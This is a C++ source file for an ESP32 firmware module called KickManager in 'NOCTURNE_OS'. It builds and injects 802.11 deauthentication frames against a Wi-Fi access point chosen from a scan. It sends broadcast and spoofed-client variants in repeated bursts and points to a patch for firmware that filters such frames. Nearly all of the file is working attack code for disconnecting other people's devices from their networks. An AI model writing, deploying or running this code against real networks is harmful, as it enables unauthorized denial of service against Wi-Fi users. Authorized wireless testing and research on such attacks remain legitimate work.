/*
 * NOCTURNE_OS — KickManager: 802.11 deauth frame injection.
 * Uses esp_wifi_80211_tx. Note: Some ESP32 firmware may filter deauth;
 * see esp32_deauth_patch if needed.
 */
#include "KickManager.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

static const uint8_t DEAUTH_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
#define DEAUTH_BURST_PER_SEC 20
#define DEAUTH_INTERVAL_MS (1000 / DEAUTH_BURST_PER_SEC)

KickManager::KickManager()
    : targetSet_(false), targetIsOwnAP_(false), attacking_(false),
      lastBurstMs_(0), packetCount_(0), targetEncryption_(WIFI_AUTH_OPEN) {
  memset(targetBSSID_, 0, 6);
  targetSSID_[0] = '\0';
  memset(deauthBuf_, 0, sizeof(deauthBuf_));
}

void KickManager::begin() {
  // WiFi already started by NetManager or when entering RADAR/KICK
}

void KickManager::setTargetFromScan(int scanIndex) {
  int n = WiFi.scanComplete();
  if (n <= 0 || scanIndex < 0 || scanIndex >= n) {
    targetSet_ = false;
    targetSSID_[0] = '\0';
    targetEncryption_ = WIFI_AUTH_OPEN;
    return;
  }
  uint8_t *bssid = WiFi.BSSID(scanIndex);
  if (!bssid)
    return;
  memcpy(targetBSSID_, bssid, 6);
  // Optimized: use c_str() instead of String
  const char *ssid = WiFi.SSID(scanIndex).c_str();
  if (ssid) {
    size_t len = strlen(ssid);
    if (len >= KICK_TARGET_SSID_LEN)
      len = KICK_TARGET_SSID_LEN - 1;
    strncpy(targetSSID_, ssid, len);
    targetSSID_[len] = '\0';
  } else {
    targetSSID_[0] = '\0';
  }
  targetEncryption_ = WiFi.encryptionType(scanIndex);
  targetSet_ = true;

  if (WiFi.status() == WL_CONNECTED) {
    const uint8_t *curBssid = WiFi.BSSID(); // no-arg: current AP (STA)
    targetIsOwnAP_ = (curBssid && memcmp(curBssid, targetBSSID_, 6) == 0);
  } else {
    targetIsOwnAP_ = false;
  }
}

bool KickManager::startAttack() {
  if (!targetSet_ || targetIsOwnAP_)
    return false;
  if (isTargetProtected()) {
    Serial.println("[KICK] WARNING: Target uses WPA3/PMF - attack may fail!");
  }
  attacking_ = true;
  lastBurstMs_ = millis();
  packetCount_ = 0;
  Serial.println("[KICK] Attack START.");
  return true;
}

void KickManager::stopAttack() {
  attacking_ = false;
  Serial.println("[KICK] Attack STOP.");
}

void KickManager::sendDeauthBurst() {
  // Проверка состояния WiFi перед отправкой
  if (WiFi.getMode() == WIFI_OFF) {
    Serial.println("[KICK] WiFi is OFF, cannot send deauth packets");
    return;
  }

  // 26-byte deauth: FC(2), Duration(2), DA(6), SA(6), BSSID(6), Seq(2),
  // Reason(2)
  deauthBuf_[0] = 0xC0;
  deauthBuf_[1] = 0x00;
  deauthBuf_[2] = 0x00;
  deauthBuf_[3] = 0x00;
  memcpy(deauthBuf_ + 4, DEAUTH_BROADCAST, 6); // DA = broadcast
  memcpy(deauthBuf_ + 10, targetBSSID_, 6);    // SA = AP
  memcpy(deauthBuf_ + 16, targetBSSID_, 6);    // BSSID = AP
  deauthBuf_[22] = 0x00;
  deauthBuf_[23] = 0x00;
  deauthBuf_[24] = 0x07; // reason: Class 3 frame received from nonassociated
                         // station (more effective)
  deauthBuf_[25] = 0x00;

  esp_err_t e =
      esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, sizeof(deauthBuf_), false);
  if (e == ESP_OK) {
    packetCount_++;
  } else if (e != ESP_ERR_WIFI_NOT_INIT) {
    // Логируем ошибки кроме "WiFi not initialized" (это нормально при старте)
    Serial.printf("[KICK] Deauth send error: %d\n", e);
  }

  // Second variant: DA=AP, SA=broadcast (fake client leaving)
  deauthBuf_[4] = targetBSSID_[0];
  deauthBuf_[5] = targetBSSID_[1];
  deauthBuf_[6] = targetBSSID_[2];
  deauthBuf_[7] = targetBSSID_[3];
  deauthBuf_[8] = targetBSSID_[4];
  deauthBuf_[9] = targetBSSID_[5];
  memcpy(deauthBuf_ + 10, DEAUTH_BROADCAST, 6);
  memcpy(deauthBuf_ + 16, targetBSSID_, 6);
  e = esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, sizeof(deauthBuf_), false);
  if (e == ESP_OK) {
    packetCount_++;
  } else if (e != ESP_ERR_WIFI_NOT_INIT) {
    Serial.printf("[KICK] Deauth send error (variant 2): %d\n", e);
  }
}

void KickManager::tick() {
  if (!attacking_ || !targetSet_ || targetIsOwnAP_)
    return;
  unsigned long now = millis();
  if (now - lastBurstMs_ < (unsigned long)DEAUTH_INTERVAL_MS)
    return;
  lastBurstMs_ = now;
  for (int i = 0; i < 3; i++) {
    sendDeauthBurst();
  }
}

void KickManager::getTargetSSID(char *out, size_t maxLen) const {
  if (maxLen == 0)
    return;
  strncpy(out, targetSSID_, maxLen - 1);
  out[maxLen - 1] = '\0';
}

void KickManager::getTargetBSSIDStr(char *out, size_t maxLen) const {
  if (maxLen < KICK_TARGET_BSSID_LEN)
    return;
  snprintf(out, maxLen, "%02X:%02X:%02X:%02X:%02X:%02X", targetBSSID_[0],
           targetBSSID_[1], targetBSSID_[2], targetBSSID_[3], targetBSSID_[4],
           targetBSSID_[5]);
}

bool KickManager::isTargetProtected() const {
  return (targetEncryption_ == WIFI_AUTH_WPA3_PSK ||
          targetEncryption_ == WIFI_AUTH_WPA2_WPA3_PSK);
}
